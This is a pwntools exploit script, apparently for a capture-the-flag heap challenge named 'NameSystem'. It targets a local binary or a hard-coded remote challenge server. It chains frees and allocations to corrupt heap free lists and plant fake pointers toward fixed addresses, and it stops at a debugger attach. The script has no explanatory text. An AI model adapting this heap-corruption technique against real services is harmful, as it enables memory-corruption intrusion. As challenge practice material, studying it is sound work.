import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	try :
		if len(sys.argv)==1 :
			io=process('./NameSystem')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./NameSystem')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('183.129.189.62',15505)
			elf=ELF('./NameSystem')
			#libc=ELF('')

		def add(a,b):
			io.sendlineafter('Your choice :\n','1')
			io.sendlineafter('Name Size:',str(a))
			io.sendafter('Name:',b)

		def delete(a):
			io.sendlineafter('Your choice :\n','3')
			io.sendlineafter('The id you want to delete:',str(a))


		for i in range(18):
			add(0x10,p64(0x131)+p64(0x131))

		add(0x3f,'a'*0x5f)
		add(0x5f,'a'*0x5f)

		delete(0)
		delete(19)

		for i in range(15):
			delete(0)


		delete(0)
		delete(0)
		bss_addr=0x60208d
		addr1=0x601f40+8
		add(0x5f,p64(bss_addr)+'\n')
		add(0x5f,p64(0x602090)+'\n')
		add(0x5f,p64(0x602090)+'\n')

		

		#delete(0)
		#add(0x58,'a'*0x58)


		gdb.attach(io)
		pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	else:
		continue